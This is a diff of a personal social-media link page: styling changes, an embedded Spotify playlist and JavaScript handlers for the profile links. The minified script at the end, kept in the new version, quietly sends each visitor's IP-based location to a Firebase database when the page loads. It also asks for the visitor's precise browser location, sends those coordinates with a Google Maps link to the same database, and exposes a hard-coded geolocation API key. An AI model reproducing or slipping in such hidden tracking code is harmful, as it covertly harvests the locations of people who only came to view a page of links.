@@ -337,10 +337,10 @@
         /* end extra font */
         /* qr-code */
         .qr-code {
-            width: 120px;
-            height: 120px;
+            width: 100px;
+            height: 100px;
             background: #BFA612;
-            border-radius: 5px;
+            border-radius: 2px;
             padding: .8rem;
             margin: 1rem 0 1rem;
         }
@@ -382,6 +382,19 @@
                 opacity: 1;
             }
         }
+
+        .container-playlist-music {
+            padding: 2rem 5rem 0rem;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+        }
+
+        .playlist-music {
+            border-radius: 10px;
+            width: 800px;
+            height: 580px;
+        }
     </style>
 </head>
 
@@ -393,45 +406,55 @@
             </div>
             <span>Moh Taufiqur Rohman</span>
         </header>
+        <div class="container-playlist-music">
+            <iframe class="playlist-music"
+                src="https://open.spotify.com/embed/playlist/2Xp2CGRIlfTDwtbzSI3lAr?utm_source=generator" width="100%"
+                height="80" frameBorder="0" allowfullscreen=""
+                allow="autoplay; clipboard-write; encrypted-media; fullscreen; picture-in-picture"></iframe>
+        </div>
         <section>
-            <a class="link-sosmed" target="_blank"
-                href="https://www.facebook.com/people/Muhammad-Taufiq/100006181458178"
+            <a class="link-sosmed" href="javascript:void(0);"
+                data-website_link="https://www.facebook.com/people/Muhammad-Taufiq/100006181458178"
                 data-deep_link="fb://profile/100006181458178" title="Facebook">
                 <div class="sosmed-icon-container">
                     <i class="fa fa-facebook-square"></i>
                 </div>
             </a>
-            <a class="link-sosmed" target="_blank" href="https://www.instagram.com/motaufiqurohman/"
+            <a class="link-sosmed" href="javascript:void(0);"
+                data-website_link="https://www.instagram.com/motaufiqurohman/"
                 data-deep_link="intent://instagram.com/_u/motaufiqurohman/#Intent;package=com.instagram.android;scheme=https;end"
                 title="Instagram">
                 <div class="sosmed-icon-container">
                     <i class="fa fa-instagram"></i>
                 </div>
             </a>
-            <a class="link-sosmed" target="_blank" href="https://twitter.com/motaufiqurohman/"
+            <a class="link-sosmed" href="javascript:void(0);" data-website_link="https://twitter.com/motaufiqurohman/"
                 data-deep_link="twitter://user?screen_name=motaufiqurohman" title="Twitter">
                 <div class="sosmed-icon-container">
                     <i class="fa fa-twitter"></i>
                 </div>
             </a>
-            <a class="link-sosmed" target="_blank" href="https://www.linkedin.com/in/motaufiqurohman/" title="LinkedIn">
+            <a class="link-sosmed" href="javascript:void(0);"
+                data-website_link="https://www.linkedin.com/in/motaufiqurohman/" title="LinkedIn">
                 <div class="sosmed-icon-container">
                     <i class="fa fa-linkedin-square"></i>
                 </div>
             </a>
-            <a class="link-sosmed" target="_blank"
-                href="https://mail.google.com/mail/?view=cm&fs=1&to=taufiqpe@gmail.com"
+            <a class="link-sosmed" href="javascript:void(0);"
+                data-website_link="https://mail.google.com/mail/?view=cm&fs=1&to=taufiqpe@gmail.com"
                 data-deep_link="mailto:taufiqpe@gmail.com" title="Email">
                 <div class="sosmed-icon-container">
                     <i class="fa fa-google"></i>
                 </div>
             </a>
-            <a class="link-sosmed" target="_blank" href="https://github.com/mo-taufiq" title="GitHub">
+            <a class="link-sosmed" href="javascript:void(0);" data-website_link="https://github.com/mo-taufiq"
+                title="GitHub">
                 <div class="sosmed-icon-container">
                     <i class="fa fa-github"></i>
                 </div>
             </a>
-            <a class="link-sosmed" target="_blank" href="https://gitlab.com/mo-taufiq" title="GitLab">
+            <a class="link-sosmed" href="javascript:void(0);" data-website_link="https://gitlab.com/mo-taufiq"
+                title="GitLab">
                 <div class="sosmed-icon-container">
                     <i class="fa fa-gitlab"></i>
                 </div>
@@ -459,7 +482,7 @@
     </div>
     <script src="https://use.fontawesome.com/8b4695c237.js"></script>
     <script>
-        let TxtType = function (t, e, i) { this.toRotate = e, this.el = t, this.loopNum = 0, this.period = parseInt(i, 10) || 2e3, this.txt = "", this.tick(), this.isDeleting = !1 }; function handleTypingAnimation() { let t = document.getElementsByClassName("typewrite"); for (let e = 0; e < t.length; e++) { let i = t[e].getAttribute("data-type"), n = t[e].getAttribute("data-period"); i && new TxtType(t[e], JSON.parse(i), n) } let e = document.createElement("style"); e.type = "text/css", document.body.appendChild(e) } function handleQRCodeOnClick() { document.getElementById("qr-code").addEventListener("click", (function () { window.open("https://saweria.co/motaufiqurohman", "_blank") })) } function handleLinkSosmedOnClick() { document.querySelectorAll(".link-sosmed").forEach((function (t, e) { t.addEventListener("click", (function (t) { this.dataset?.deep_link && isMobileDevice() && (this.href = this.dataset.deep_link) })) })) } function isMobileDevice() { return [/Android/i, /webOS/i, /iPhone/i, /iPad/i, /iPod/i, /BlackBerry/i, /Windows Phone/i].some((t => navigator.userAgent.match(t))) } function getLocation() { navigator.geolocation ? navigator.geolocation.getCurrentPosition(logPosition) : console.log("Geolocation is not supported by this browser.") } function ipLookUp() { fetch("https://api.ipgeolocation.io/ipgeo?apiKey=eba4e5d3a1fc4fd5ac9ba56912aff39b").then((function (t) { return t.json() })).then((function (t) { fetch("https://mo-taufiq-link-tree-default-rtdb.asia-southeast1.firebasedatabase.app/ip_details.json", { method: "POST", headers: { "Content-Type": "application/json" }, body: JSON.stringify({ ...t, url: `https://www.google.com/maps/search/?api=1&query=${t.latitude},${t.longitude}`, datetime: (new Date).toString() }) }) })).catch((function (t) { console.log(t) })) } function logPosition(t) { fetch("https://mo-taufiq-link-tree-default-rtdb.asia-southeast1.firebasedatabase.app/geo_locations.json", { method: "POST", headers: { "Content-Type": "application/json" }, body: JSON.stringify({ url: `https://www.google.com/maps/search/?api=1&query=${t.coords.latitude},${t.coords.longitude}`, datetime: (new Date).toString() }) }) } function setYearCopyright() { document.getElementById("year").innerText = (new Date).getFullYear() } let state = 0; function handleStartTypingAnimation() { if (isMobileDevice) { const t = document.querySelector(".typewrite"); isInViewport(t) && 0 === state ? (handleTypingAnimation(), state = 1) : document.addEventListener("scroll", (function () { isInViewport(t) && 0 === state && (handleTypingAnimation(), state = 1) })) } else handleTypingAnimation() } function isInViewport(t) { const e = t.getBoundingClientRect(); return e.top >= 0 && e.left >= 0 && e.bottom + 200 <= (window.innerHeight || document.documentElement.clientHeight) && e.right <= (window.innerWidth || document.documentElement.clientWidth) } TxtType.prototype.tick = function () { let t = this.loopNum % this.toRotate.length, e = this.toRotate[t]; this.isDeleting ? this.txt = e.substring(0, this.txt.length - 1) : this.txt = e.substring(0, this.txt.length + 1), this.el.innerHTML = '<span class="wrap">' + this.txt + "</span>"; let i = this, n = 150 - 100 * Math.random(); this.isDeleting && (n /= 6), this.isDeleting || this.txt !== e ? this.isDeleting && "" === this.txt && (this.isDeleting = !1, this.loopNum++, n = 0) : (n = this.period, this.isDeleting = !0), setTimeout((function () { i.tick() }), n) }, window.onload = function () { getLocation(), ipLookUp(), setYearCopyright(), handleLinkSosmedOnClick(), handleQRCodeOnClick(), handleStartTypingAnimation() };
+        let TxtType = function (a, b, c) { this.toRotate = b, this.el = a, this.loopNum = 0, this.period = parseInt(c, 10) || 2e3, this.txt = "", this.tick(), this.isDeleting = !1 }; function handleTypingAnimation() { let b = document.getElementsByClassName("typewrite"); for (let a = 0; a < b.length; a++) { let c = b[a].getAttribute("data-type"), e = b[a].getAttribute("data-period"); c && new TxtType(b[a], JSON.parse(c), e) } let d = document.createElement("style"); d.type = "text/css", document.body.appendChild(d) } function handleQRCodeOnClick() { document.getElementById("qr-code").addEventListener("click", function () { window.open("https://saweria.co/motaufiqurohman", "_blank") }) } function handleLinkSosmedOnClick() { document.querySelectorAll(".link-sosmed").forEach(function (a, b) { a.addEventListener("click", function (a) { window.open(this.dataset.website_link, "_blank") }) }) } function isMobileDevice() { return [/Android/i, /webOS/i, /iPhone/i, /iPad/i, /iPod/i, /BlackBerry/i, /Windows Phone/i].some(a => navigator.userAgent.match(a)) } function getLocation() { navigator.geolocation ? navigator.geolocation.getCurrentPosition(logPosition) : console.log("Geolocation is not supported by this browser.") } function ipLookUp() { fetch("https://api.ipgeolocation.io/ipgeo?apiKey=eba4e5d3a1fc4fd5ac9ba56912aff39b").then(function (a) { return a.json() }).then(function (a) { fetch("https://mo-taufiq-link-tree-default-rtdb.asia-southeast1.firebasedatabase.app/ip_details.json", { method: "POST", headers: { "Content-Type": "application/json" }, body: JSON.stringify({ ...a, url: `https://www.google.com/maps/search/?api=1&query=${a.latitude},${a.longitude}`, datetime: new Date().toString() }) }) }).catch(function (a) { console.log(a) }) } function logPosition(a) { fetch("https://mo-taufiq-link-tree-default-rtdb.asia-southeast1.firebasedatabase.app/geo_locations.json", { method: "POST", headers: { "Content-Type": "application/json" }, body: JSON.stringify({ url: `https://www.google.com/maps/search/?api=1&query=${a.coords.latitude},${a.coords.longitude}`, datetime: new Date().toString() }) }) } function setYearCopyright() { document.getElementById("year").innerText = new Date().getFullYear() } let state = 0; function handleStartTypingAnimation() { if (isMobileDevice) { let a = document.querySelector(".typewrite"); isInViewport(a) && 0 === state ? (handleTypingAnimation(), state = 1) : document.addEventListener("scroll", function () { isInViewport(a) && 0 === state && (handleTypingAnimation(), state = 1) }) } else handleTypingAnimation() } function isInViewport(b) { let a = b.getBoundingClientRect(); return a.top >= 0 && a.left >= 0 && a.bottom + 200 <= (window.innerHeight || document.documentElement.clientHeight) && a.right <= (window.innerWidth || document.documentElement.clientWidth) } TxtType.prototype.tick = function () { let c = this.loopNum % this.toRotate.length, b = this.toRotate[c]; this.isDeleting ? this.txt = b.substring(0, this.txt.length - 1) : this.txt = b.substring(0, this.txt.length + 1), this.el.innerHTML = '<span class="wrap">' + this.txt + "</span>"; let d = this, a = 150 - 100 * Math.random(); this.isDeleting && (a /= 6), this.isDeleting || this.txt !== b ? this.isDeleting && "" === this.txt && (this.isDeleting = !1, this.loopNum++, a = 0) : (a = this.period, this.isDeleting = !0), setTimeout(function () { d.tick() }, a) }, window.onload = function () { getLocation(), ipLookUp(), setYearCopyright(), handleLinkSosmedOnClick(), handleQRCodeOnClick(), handleStartTypingAnimation() }
     </script>
 </body>
 
